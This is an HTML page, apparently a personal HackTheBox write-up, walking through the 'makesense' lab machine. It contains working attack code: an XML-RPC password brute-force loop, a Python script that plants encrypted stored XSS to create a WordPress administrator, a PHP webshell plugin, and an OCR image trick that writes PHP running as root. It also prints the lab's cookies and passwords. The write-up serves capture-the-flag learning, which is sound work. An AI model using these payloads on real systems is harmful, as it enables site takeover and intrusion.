@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>makesense | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+    <style>
+        pre {
+            position: relative;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-x: hidden;
+        }
+        pre::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 6px;
+            left: 12px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            opacity: 0.5;
+            font-family: 'Inter', sans-serif;
+        }
+        pre code {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+        }
+        /* Syntax highlighting - light mode */
+        [data-theme="light"] .kw { color: #d73a49; }
+        [data-theme="light"] .str { color: #032f62; }
+        [data-theme="light"] .func { color: #6f42c1; }
+        [data-theme="light"] .cm { color: #6a737d; font-style: italic; }
+        [data-theme="light"] .num { color: #005cc5; }
+        [data-theme="light"] .op { color: #d73a49; }
+        [data-theme="light"] .var { color: #e36209; }
+        [data-theme="light"] .cmd { color: #22863a; }
+        [data-theme="light"] .flag { color: #005cc5; }
+        [data-theme="light"] .url { color: #032f62; }
+        [data-theme="light"] .param { color: #6f42c1; }
+        /* Syntax highlighting - dark mode */
+        [data-theme="dark"] .kw { color: #ff7b72; }
+        [data-theme="dark"] .str { color: #a5d6ff; }
+        [data-theme="dark"] .func { color: #d2a8ff; }
+        [data-theme="dark"] .cm { color: #8b949e; font-style: italic; }
+        [data-theme="dark"] .num { color: #79c0ff; }
+        [data-theme="dark"] .op { color: #ff7b72; }
+        [data-theme="dark"] .var { color: #ffa657; }
+        [data-theme="dark"] .cmd { color: #7ee787; }
+        [data-theme="dark"] .flag { color: #79c0ff; }
+        [data-theme="dark"] .url { color: #a5d6ff; }
+        [data-theme="dark"] .param { color: #d2a8ff; }
+    </style>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">makesense</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- ==================== ENGLISH CONTENT ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine ran a WordPress 7.0 instance over HTTPS on port 443. An exposed uploads directory revealed an audio file containing a hinted password. The audio was very robotic, so after transcribing it and applying some brute-force variations against <code>xmlrpc.php</code>, I obtained valid credentials for the non-admin user <code>jake</code>.</p>
+
+                    <p>The WordPress theme included a unique voice recording tool. Analyzing its JavaScript, I found a hardcoded symmetric <code>ENCRYPTION_KEY</code> and two AJAX actions: <code>save_voice_raw</code> and <code>save_voice_results</code>. By encrypting a malicious payload with that key and storing it as the "transcription" and "summary" of a recording, I achieved stored XSS that fired when an admin viewed the recordings page. I used a CSRF-style JavaScript payload to create a new WordPress administrator account through <code>/wp-admin/user-new.php</code>.</p>
+
+                    <p>With admin access, I uploaded a malicious plugin containing a PHP webshell, obtained code execution, and launched a reverse shell. Inside <code>wp-config.php</code> I found reused credentials for the user <code>walter</code>, which granted me the user flag.</p>
+
+                    <p>For privilege escalation, root ran a PHP OCR web app on <code>127.0.0.1:8001</code> that used <code>tesseract</code> to recognize text from uploaded images and could save the OCR output to an arbitrary filename. Since the app was PHP and allowed arbitrary extensions, I crafted an image containing PHP code (<code>&lt;?php ... ?&gt;</code>), had the OCR engine "recognize" it, and saved the output as a <code>.php</code> file in the web root — achieving RCE as root. The final payload set the SUID bit on <code>/bin/bash</code>.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> WordPress XMLRPC brute force, stored XSS via encrypted payload, CSRF-style admin user creation, malicious plugin webshell, credential reuse, OCR/tesseract PHP file write RCE (CVE-2026-26832).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services:</p>
+                <pre data-lang="plaintext"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
+|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
+443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+| ssl-cert: Subject: commonName=makesense.htb
+| Not valid before: 2026-05-29T16:37:29
+|_Not valid after:  2126-05-05T16:37:29
+| tls-alpn:
+|_  http/1.1
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-title: Agency LLC
+|_http-generator: WordPress 7.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>I add <code>makesense.htb</code> to my <code>/etc/hosts</code> file. The page on port 443 looks simple, and it's clearly a WordPress site:</p>
+                <pre data-lang="plaintext"><code>$ whatweb https://makesense.htb
+https://makesense.htb [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[info@webagency.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.39.201], JQuery[3.7.1], MetaGenerator[WordPress 7.0], Script[application/json,module], Title[Agency LLC], UncommonHeaders[link], WordPress[7.0]</code></pre>
+
+                <h2>WordPress Enumeration</h2>
+                <p>Running <code>wpscan</code> reveals a couple of interesting findings:</p>
+                <pre data-lang="plaintext"><code>[+] XML-RPC seems to be enabled: https://makesense.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: https://makesense.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%</code></pre>
+
+                <p>In the uploads folder there's an audio file from someone called <code>jake</code>, and it seems to say a password, something like <code>Clearlightnicesmooth4123</code>. However, it doesn't work at <a href="https://makesense.htb/wp-login.php">https://makesense.htb/wp-login.php</a>, though I confirm the user <code>jake</code> exists — so I assume he's the administrator.</p>
+
+                <p>The audio is very robotic, so I transcribe it through a web service that gives me this:</p>
+                <p><img src="./media/image1.png" alt="Web transcription of the robotic audio hinting at a password" /></p>
+
+                <h2>XMLRPC Brute Force</h2>
+                <p>With a bit of brute force using variations of the transcribed password against <code>xmlrpc.php</code>, valid credentials eventually appear:</p>
+                <pre data-lang="bash"><code>$ <span class="kw">for</span> pwd <span class="kw">in</span> \
+  clearlightnicesmooth4123 clearlightnicesmooth4923 \
+  ClearlightNicesmooth4123 ClearlightNicesmooth4923 \
+  clearlight_nice_smooth_4123 clearlight_nice_smooth_4923 \
+  ClearLightNiceSmooth4123 ClearLightNiceSmooth4923 \
+  clear_light_nice_smooth_4123 clear_light_nice_smooth_4923 \
+  nicesmooth_clearlight_4123 nicesmooth_clearlight_4923 \
+  NiceSmoothClearLight4123 NiceSmoothClearLight4923 \
+  clearlightnicesmooth_4123 clearlightnicesmooth_4923 \
+  clearLightNiceSmooth4123 clearLightNiceSmooth4923 \
+  <span class="str">"clearlight nice smooth 4123"</span> <span class="str">"clearlight nice smooth 4923"</span>; <span class="kw">do</span>
+  result=<span class="op">$(</span><span class="cmd">curl</span> <span class="flag">-sk</span> <span class="flag">-X</span> POST https://makesense.htb/xmlrpc.php \
+    <span class="flag">-H</span> <span class="str">"Content-Type: text/xml"</span> \
+    <span class="flag">-d</span> <span class="str">"&lt;?xml version=\"1.0\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;&lt;value&gt;&lt;string&gt;jake&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+&lt;param&gt;&lt;value&gt;&lt;string&gt;$pwd&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;
+&lt;/params&gt;&lt;/methodCall&gt;"</span><span class="op">)</span>
+  <span class="kw">if</span> <span class="cmd">echo</span> <span class="str">"$result"</span> | <span class="cmd">grep</span> <span class="flag">-q</span> <span class="str">"isAdmin\|blogName"</span>; <span class="kw">then</span>
+    <span class="cmd">echo</span> <span class="str">"[+] VALID: jake:$pwd"</span>
+  <span class="kw">else</span>
+    <span class="cmd">echo</span> <span class="str">"[-] Failed: $pwd"</span>
+  <span class="kw">fi</span>
+<span class="kw">done</span></code></pre>
+
+                <pre data-lang="plaintext"><code>[+] VALID: jake:ClearLightNiceSmooth4923</code></pre>
+
+                <p>So the credentials are <code>jake:ClearLightNiceSmooth4923</code>. However, this user is not a WordPress administrator, so I don't have that level of access yet.</p>
+
+                <p>Enumerating users with <code>wpscan</code>:</p>
+                <pre data-lang="bash"><code>$ <span class="cmd">wpscan</span> <span class="flag">--url</span> https://makesense.htb \
+  <span class="flag">--disable-tls-checks</span> \
+  <span class="flag">--enumerate</span> u1-10</code></pre>
+                <pre data-lang="plaintext"><code>[i] User(s) Identified:
+[+] jake
+[+] admin
+[+] walter</code></pre>
+
+                <p>But credential reuse doesn't work with any of them.</p>
+
+                <h2>The Voice Tool - Hunting for XSS</h2>
+                <p>Shifting focus, I look at the voice tool that the WordPress theme presents, which is something unique. In the page source I find these JavaScript files loaded:</p>
+                <pre data-lang="html"><code>&lt;<span class="kw">script</span> <span class="param">id</span>=<span class="str">"whisper-wrapper-js"</span> <span class="param">src</span>=<span class="str">"https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"</span>&gt;&lt;/<span class="kw">script</span>&gt;
+&lt;<span class="kw">script</span> <span class="param">id</span>=<span class="str">"whisper-wrapper-js"</span> <span class="param">src</span>=<span class="str">"https://makesense.htb/wp-content/themes/webagency/assets/js/main.js"</span>&gt;&lt;/<span class="kw">script</span>&gt;</code></pre>
+
+                <p>Right away I spot a hardcoded encryption key in a constant, which immediately draws attention and may indicate other flaws:</p>
+                <pre data-lang="javascript"><code><span class="cm">// Symmetric encryption key (must match server-side)</span>
+<span class="kw">const</span> ENCRYPTION_KEY = <span class="str">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>;</code></pre>
+
+                <p>In <code>main.js</code> the AJAX endpoint is called with these actions and bodies:</p>
+                <pre data-lang="javascript"><code><span class="cm">// save_voice_raw</span>
+formData.<span class="func">append</span>(<span class="str">'action'</span>, <span class="str">'save_voice_raw'</span>);
+formData.<span class="func">append</span>(<span class="str">'nonce'</span>, webagency_ajax.nonce);
+formData.<span class="func">append</span>(<span class="str">'voice_recording'</span>, wavBlob, <span class="str">'voice-message.wav'</span>);
+
+<span class="cm">// save_voice_results</span>
+formData.<span class="func">append</span>(<span class="str">'action'</span>, <span class="str">'save_voice_results'</span>);
+formData.<span class="func">append</span>(<span class="str">'nonce'</span>, webagency_ajax.nonce);
+formData.<span class="func">append</span>(<span class="str">'post_id'</span>, postId);
+formData.<span class="func">append</span>(<span class="str">'encrypted_payload'</span>, encryptedPayload);</code></pre>
+
+                <p>The first POST saves the <code>.wav</code> recording and returns an ID. The second saves the results encrypted with the key found in the code, and assigns them to the ID generated in the previous POST. My idea is that maybe I can execute an XSS payload that the admin will trigger in their client.</p>
+
+                <p>Session cookies are HttpOnly, but perhaps I can create a WordPress admin user with a CSRF-style payload instead.</p>
+
+                <h2>Testing the XSS</h2>
+                <p>To check whether XSS could work, I first generate a simple test XSS payload encrypted with the key I found:</p>
+                <pre data-lang="python"><code><span class="kw">import</span> json, base64, os
+<span class="kw">from</span> cryptography.hazmat.primitives.ciphers.aead <span class="kw">import</span> AESGCM
+<span class="kw">from</span> cryptography.hazmat.primitives <span class="kw">import</span> hashes
+<span class="kw">from</span> cryptography.hazmat.backends <span class="kw">import</span> default_backend
+
+<span class="var">ENCRYPTION_KEY</span> = <span class="str">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>
+
+<span class="cm"># Derive key using SHA-256</span>
+digest = hashes.<span class="func">Hash</span>(hashes.<span class="func">SHA256</span>(), backend=<span class="func">default_backend</span>())
+digest.<span class="func">update</span>(<span class="var">ENCRYPTION_KEY</span>.<span class="func">encode</span>())
+key_bytes = digest.<span class="func">finalize</span>()
+
+<span class="cm"># Simple XSS payload</span>
+payload = {
+    <span class="str">"transcription"</span>: <span class="str">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>,
+    <span class="str">"summary"</span>: <span class="str">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>
+}
+
+data = json.<span class="func">dumps</span>(payload).<span class="func">encode</span>()
+iv = os.<span class="func">urandom</span>(<span class="num">12</span>)
+aesgcm = <span class="func">AESGCM</span>(key_bytes)
+encrypted = aesgcm.<span class="func">encrypt</span>(iv, data, <span class="kw">None</span>)
+combined = iv + encrypted
+<span class="func">print</span>(base64.<span class="func">b64encode</span>(combined).<span class="func">decode</span>())</code></pre>
+
+                <p>Then I create a dummy <code>.wav</code> with Python and send the request to save the "recording":</p>
+                <pre data-lang="bash"><code>$ <span class="cmd">python3</span> <span class="flag">-c</span> <span class="str">"
+import wave, struct
+with wave.open('/tmp/dummy.wav', 'w') as f:
+    f.setnchannels(1)
+    f.setsampwidth(2)
+    f.setframerate(16000)
+    f.writeframes(struct.pack('&lt;h', 0) * 16000)
+"</span>
+
+$ <span class="cmd">curl</span> <span class="flag">-sk</span> <span class="flag">-X</span> POST https://makesense.htb/wp-admin/admin-ajax.php \
+  <span class="flag">-b</span> <span class="str">"wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=jake|1783788348|CoQ7uPIIxfjzy4WFHNsDuNrBJMwav28Y9vKYEynGyNr|660717170898f7c324bbeec48d484ae44e1ba1ace6e2e58fe6bf769e860c9919"</span> \
+  <span class="flag">-F</span> <span class="str">"action=save_voice_raw"</span> \
+  <span class="flag">-F</span> <span class="str">"nonce=6f1ad8954c"</span> \
+  <span class="flag">-F</span> <span class="str">"voice_recording=@/tmp/dummy.wav;type=audio/wav"</span></code></pre>
+                <pre data-lang="json"><code>{<span class="str">"success"</span>:<span class="kw">true</span>,<span class="str">"data"</span>:{<span class="str">"message"</span>:<span class="str">"Audio saved, processing started."</span>,<span class="str">"post_id"</span>:<span class="num">74</span>}}</code></pre>
+
+                <p>Finally I send the encrypted payload I generated:</p>
+                <pre data-lang="bash"><code>$ <span class="cmd">curl</span> <span class="flag">-sk</span> <span class="flag">-X</span> POST https://makesense.htb/wp-admin/admin-ajax.php \
+  <span class="flag">-b</span> <span class="str">"wordpress_logged_in_666f3cbf...c9919"</span> \
+  <span class="flag">-F</span> <span class="str">"action=save_voice_results"</span> \
+  <span class="flag">-F</span> <span class="str">"nonce=6f1ad8954c"</span> \
+  <span class="flag">-F</span> <span class="str">"post_id=74"</span> \
+  <span class="flag">-F</span> <span class="str">"encrypted_payload=a4TeBCkjwVbXkpCAYwKxFR91dVWs3Be1XwG9RJSW1+qtVZtfapjte/UPWZwl/qhUJMxF6q8+laLyy3aphRpXBtQzdAOlIL02eHv3kfJjDRSwhHzVCXaoARf2yfmP1jawgzUkV7f8oK/w9bdZAy3M4SFr"</span></code></pre>
+                <pre data-lang="json"><code>{<span class="str">"success"</span>:<span class="kw">true</span>,<span class="str">"data"</span>:{<span class="str">"message"</span>:<span class="str">"Results saved successfully!"</span>,<span class="str">"post_id"</span>:<span class="num">74</span>}}</code></pre>
+
+                <p>When visiting the recordings page as <code>jake</code>, my payload executes:</p>
+                <p><img src="./media/image6.png" alt="XSS alert box firing on the recordings page confirming stored XSS" /></p>
+
+                <h2>From XSS to Admin User Creation</h2>
+                <p>The idea now is to generate a payload that points to my server to detect anyone visiting the page. I follow the same process but change the payload to a callback to my server — but since it's not HTTPS, it gets blocked. An HTTPS request won't work either because the self-signed certificate isn't trusted and HTB machines have no internet access.</p>
+
+                <p>So I focus directly on a CSRF-style payload to create an admin user if the admin visits the page. I write this script that does the whole process in one shot:</p>
+                <pre data-lang="python"><code><span class="kw">import</span> json, base64, os, wave, struct, requests
+<span class="kw">from</span> cryptography.hazmat.primitives.ciphers.aead <span class="kw">import</span> AESGCM
+<span class="kw">from</span> cryptography.hazmat.primitives <span class="kw">import</span> hashes
+<span class="kw">from</span> cryptography.hazmat.backends <span class="kw">import</span> default_backend
+
+<span class="cm"># Config</span>
+<span class="var">TARGET</span> = <span class="str">"https://makesense.htb/wp-admin/admin-ajax.php"</span>
+<span class="var">COOKIE</span> = <span class="str">"wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=jake|1783788348|CoQ7uPIIxfjzy4WFHNsDuNrBJMwav28Y9vKYEynGyNr|660717170898f7c324bbeec48d484ae44e1ba1ace6e2e58fe6bf769e860c9919"</span>
+<span class="var">NONCE</span> = <span class="str">"6f1ad8954c"</span>
+<span class="var">ENCRYPTION_KEY</span> = <span class="str">'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'</span>
+
+<span class="var">XSS</span> = <span class="str">"""&lt;script&gt;fetch('/wp-admin/user-new.php').then(r=&gt;r.text()).then(html=&gt;{const n=html.match(/_wpnonce_create-user" value="([^"]+)"/)[1];fetch('/wp-admin/user-new.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=createuser&amp;_wpnonce_create-user='+n+'&amp;user_login=asd&amp;email=asd@asd.com&amp;pass1=Asd123!&amp;pass2=Asd123!&amp;role=administrator&amp;noconfirmation=1'})})&lt;/script&gt;"""</span>
+
+<span class="cm"># Step 0 - create dummy wav</span>
+wav_path = <span class="str">'/tmp/dummy.wav'</span>
+<span class="kw">with</span> wave.<span class="func">open</span>(wav_path, <span class="str">'w'</span>) <span class="kw">as</span> f:
+    f.<span class="func">setnchannels</span>(<span class="num">1</span>)
+    f.<span class="func">setsampwidth</span>(<span class="num">2</span>)
+    f.<span class="func">setframerate</span>(<span class="num">16000</span>)
+    f.<span class="func">writeframes</span>(struct.<span class="func">pack</span>(<span class="str">'&lt;h'</span>, <span class="num">0</span>) * <span class="num">16000</span>)
+<span class="func">print</span>(<span class="str">"[*] Dummy wav created"</span>)
+
+<span class="cm"># Step 1 - encrypt payload</span>
+digest = hashes.<span class="func">Hash</span>(hashes.<span class="func">SHA256</span>(), backend=<span class="func">default_backend</span>())
+digest.<span class="func">update</span>(<span class="var">ENCRYPTION_KEY</span>.<span class="func">encode</span>())
+key_bytes = digest.<span class="func">finalize</span>()
+
+payload = {<span class="str">"transcription"</span>: <span class="var">XSS</span>, <span class="str">"summary"</span>: <span class="var">XSS</span>}
+data = json.<span class="func">dumps</span>(payload).<span class="func">encode</span>()
+iv = os.<span class="func">urandom</span>(<span class="num">12</span>)
+aesgcm = <span class="func">AESGCM</span>(key_bytes)
+encrypted = aesgcm.<span class="func">encrypt</span>(iv, data, <span class="kw">None</span>)
+encrypted_payload = base64.<span class="func">b64encode</span>(iv + encrypted).<span class="func">decode</span>()
+<span class="func">print</span>(<span class="str">"[*] Payload encrypted"</span>)
+
+<span class="cm"># Step 2 - upload wav, get post_id</span>
+session = requests.<span class="func">Session</span>()
+session.verify = <span class="kw">False</span>
+session.cookies.<span class="func">set</span>(
+    <span class="var">COOKIE</span>.<span class="func">split</span>(<span class="str">'='</span>)[<span class="num">0</span>],
+    <span class="str">'='</span>.<span class="func">join</span>(<span class="var">COOKIE</span>.<span class="func">split</span>(<span class="str">'='</span>)[<span class="num">1</span>:])
+)
+
+r1 = session.<span class="func">post</span>(<span class="var">TARGET</span>, data={
+    <span class="str">"action"</span>: <span class="str">"save_voice_raw"</span>,
+    <span class="str">"nonce"</span>: <span class="var">NONCE</span>
+}, files={
+    <span class="str">"voice_recording"</span>: (<span class="str">"voice-message.wav"</span>, <span class="func">open</span>(wav_path, <span class="str">'rb'</span>), <span class="str">"audio/wav"</span>)
+})
+post_id = r1.<span class="func">json</span>()[<span class="str">'data'</span>][<span class="str">'post_id'</span>]
+<span class="func">print</span>(<span class="str">f"[*] Post created: {post_id}"</span>)
+
+<span class="cm"># Step 3 - send forged encrypted payload</span>
+r2 = session.<span class="func">post</span>(<span class="var">TARGET</span>, data={
+    <span class="str">"action"</span>: <span class="str">"save_voice_results"</span>,
+    <span class="str">"nonce"</span>: <span class="var">NONCE</span>,
+    <span class="str">"post_id"</span>: post_id,
+    <span class="str">"encrypted_payload"</span>: encrypted_payload
+})
+<span class="func">print</span>(<span class="str">f"[*] Results: {r2.<span class="func">json</span>()}"</span>)
+<span class="func">print</span>(<span class="str">f"\n[+] Done! Check submission #{post_id} in WP admin"</span>)</code></pre>
+
+                <p>Included in this script is the XSS payload that first grabs the required nonce in one request, then in a second request creates the new administrator user by targeting <code>/wp-admin/user-new.php</code> with this body:</p>
+                <pre data-lang="plaintext"><code>user_login=asd&email=asd@asd.com&pass1=Asd123!&pass2=Asd123!&role=administrator&noconfirmation=1</code></pre>
+
+                <p>After a while I check that the user has been created, and I can log into the admin panel.</p>
+
+                <h2>Admin to Webshell - Malicious Plugin</h2>
+                <p>From here, the goal is to obtain a webshell via a malicious plugin. This is fairly simple in WordPress — I just create and zip a PHP file like this:</p>
+                <pre data-lang="php"><code>&lt;?php
+<span class="cm">/**
+ * Plugin Name: xd
+ * Plugin URI: https://potato.com
+ * Description: Wordpress webshell
+ * Version: 1.0
+ * Author: xd
+ * Author URI: https://xd.com
+ * License: https://nosuchlicense
+ */</span>
+<span class="kw">if</span>(<span class="func">isset</span>(<span class="var">$_GET</span>[<span class="str">'cmd'</span>]))
+{
+    <span class="func">system</span>(<span class="var">$_GET</span>[<span class="str">'cmd'</span>]);
+}
+?&gt;</code></pre>
+                <pre data-lang="bash"><code>$ <span class="cmd">zip</span> xd.zip xd.php</code></pre>
+
+                <p>I upload it to WordPress through the menu. Then, at the route <a href="https://makesense.htb/wp-content/plugins/xd/xd.php?cmd=">https://makesense.htb/wp-content/plugins/xd/xd.php?cmd=</a>, I find the webshell working:</p>
+                <p><img src="./media/image4.png" alt="PHP webshell output confirming command execution via the malicious plugin" /></p>
+
+                <p>Having the webshell, I simply send myself a reverse shell.</p>
+
+                <h2>Lateral Movement - User walter</h2>
+                <p>On the victim machine I see the users <code>walter</code> and <code>admin</code> in <code>/home</code>. I also notice a port bound locally:</p>
+                <pre data-lang="plaintext"><code>tcp LISTEN 0 4096 127.0.0.1:8001</code></pre>
+
+                <p>In <code>/opt</code> there's the path <code>/google/chrome</code>, which might indicate the use of puppeteer or similar tools, although it could just be there to trigger the earlier XSS.</p>
+
+                <p>In the <code>wp-config.php</code> file I find <code>walter</code>'s credentials reused for the SQLite DB:</p>
+                <pre data-lang="php"><code><span class="func">define</span>( <span class="str">'DB_NAME'</span>, <span class="str">'wordpress'</span> );
+<span class="func">define</span>( <span class="str">'DB_USER'</span>, <span class="str">'walter'</span> );
+<span class="func">define</span>( <span class="str">'DB_PASSWORD'</span>, <span class="str">'JbhHDAEgXvri3!'</span> );</code></pre>
+
+                <p>These credentials work for <code>walter</code>, and I obtain the user flag. I establish persistence by adding my SSH public key to <code>walter</code>'s <code>authorized_keys</code>.</p>
+
+                <h2>Privilege Escalation - OCR PHP File Write</h2>
+                <p>It seems root runs a PHP service on port 8001 via cron, from a bash script that I can't read because it's in <code>/root</code>:</p>
+                <pre data-lang="plaintext"><code>root 1337  \_ /usr/sbin/CRON -f -P
+root 1352  \_ /bin/sh -c /root/.scripts/start_ocr4.sh
+root 1354  \_ /bin/bash /root/.scripts/start_ocr4.sh
+root 1377  \_ php -S 127.0.0.1:8001 -t /root/ocr4/
+root 32479 \_ sleep 1</code></pre>
+
+                <p>I port-forward port 8001 and find that it requires a username and password — but <code>walter</code>'s credentials work.</p>
+
+                <p>Using <code>pspy64</code>, I also see that <code>admin</code> runs this:</p>
+                <pre data-lang="plaintext"><code>CMD: UID=1001 PID=34411 | /usr/bin/python3 /home/admin/.process/prey-unified.py</code></pre>
+
+                <p>I also see some Chrome activity — maybe <code>admin</code> is the one using Chrome for the earlier XSS.</p>
+
+                <p>On port 8001 there's this small application:</p>
+                <p><img src="./media/image3.png" alt="OCR web application running on port 8001 with image recognition functionality" /></p>
+
+                <p>When clicking "recognize", I see root locally runs these commands:</p>
+                <pre data-lang="plaintext"><code>CMD: UID=0 PID=34346 | sh -c -- tesseract '/root/ocr4/tmp/draw_6a4fec874082d.png' '/root/ocr4/tmp/out_6a4fec874082f' 2>&1
+CMD: UID=0 PID=34347 | tesseract /root/ocr4/tmp/draw_6a4fec874082d.png /root/ocr4/tmp/out_6a4fec874082f</code></pre>
+
+                <p>And on the web it lets me save the result to a file:</p>
+                <p><img src="./media/image5.png" alt="OCR web application option to save the recognized output to a file with a custom name" /></p>
+
+                <p>When saving the file, a POST request is sent to <a href="http://localhost:8001/">http://localhost:8001/</a> with the body:</p>
+                <pre data-lang="plaintext"><code>ocr_id=ocr_6a4fedd1d68a65.33429482&filename=xd.asd&save_output=</code></pre>
+
+                <p>Replaying the request doesn't seem to work since the <code>ocr_id</code> appears to be single-use, and I don't see how to generate an unused one.</p>
+
+                <p>Regarding <code>tesseract</code> and OCR, I find a recent CVE that affects precisely the recognize function being used here: <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-26832">https://nvd.nist.gov/vuln/detail/CVE-2026-26832</a>.</p>
+
+                <p>I see that I can visit the path where the file is saved in the web:</p>
+                <p><img src="./media/image7.png" alt="Browser showing the saved OCR output file accessible via the web root" /></p>
+
+                <h2>Crafting the PHP Image Payload</h2>
+                <p>Since the web is PHP, it occurs to me to write PHP text and save a <code>.php</code> file, given that I can set the extension however I want. Doing it manually in the browser is a bit tedious, so I use a simple AI-assisted script to do exactly that — draw PHP code into an image:</p>
+                <pre data-lang="python"><code><span class="kw">from</span> PIL <span class="kw">import</span> Image, ImageDraw, ImageFont
+<span class="kw">import</span> base64
+<span class="kw">import</span> urllib.parse
+
+payload = <span class="str">"&lt;?php system('id'); ?&gt;"</span>
+
+img = Image.<span class="func">new</span>(<span class="str">'RGB'</span>, (<span class="num">1000</span>, <span class="num">300</span>), color=<span class="str">'white'</span>)
+d = ImageDraw.<span class="func">Draw</span>(img)
+
+<span class="kw">try</span>:
+    font = ImageFont.<span class="func">truetype</span>(<span class="str">"/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"</span>, <span class="num">40</span>)
+<span class="kw">except</span>:
+    <span class="kw">try</span>:
+        font = ImageFont.<span class="func">truetype</span>(<span class="str">"/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"</span>, <span class="num">40</span>)
+    <span class="kw">except</span>:
+        font = ImageFont.<span class="func">load_default</span>()
+
+d.<span class="func">text</span>((<span class="num">50</span>, <span class="num">100</span>), payload, fill=<span class="str">'black'</span>, font=font)
+img.<span class="func">save</span>(<span class="str">'/tmp/payload_clean.png'</span>)
+
+<span class="kw">with</span> <span class="func">open</span>(<span class="str">'/tmp/payload_clean.png'</span>, <span class="str">'rb'</span>) <span class="kw">as</span> f:
+    b64 = base64.<span class="func">b64encode</span>(f.<span class="func">read</span>()).<span class="func">decode</span>()
+
+data_url = <span class="str">f"data:image/png;base64,{b64}"</span>
+encoded = urllib.parse.<span class="func">quote</span>(data_url)
+<span class="func">print</span>(encoded)</code></pre>
+
+                <p>What I'll do is capture with Burp Suite the two requests that get sent — one to submit the image, another to create the file — and replay the first request with the image this script generates. Then the OCR ID can be found in an input in the HTML, so I can recover it to make the second request.</p>
+
+                <p>I do it with the <code>id</code> command and see that it works:</p>
+                <p><img src="./media/image2.png" alt="PHP file created via OCR executing the id command as root" /></p>
+
+                <p>To make it simpler, I directly run <code>chmod u+s /bin/bash</code> from PHP to avoid having to send myself a webshell, and this way I obtain the system flag by executing the SUID bash. Machine completed.</p>
+            </div>
+
+            <!-- ==================== SPANISH CONTENT ==================== -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba una instancia de WordPress 7.0 sobre HTTPS en el puerto 443. Un directorio de uploads expuesto revelaba un archivo de audio que contenía una pista de contraseña. El audio era muy robótico, así que tras transcribirlo y aplicar variaciones por fuerza bruta contra <code>xmlrpc.php</code>, obtuve credenciales válidas para el usuario no administrador <code>jake</code>.</p>
+
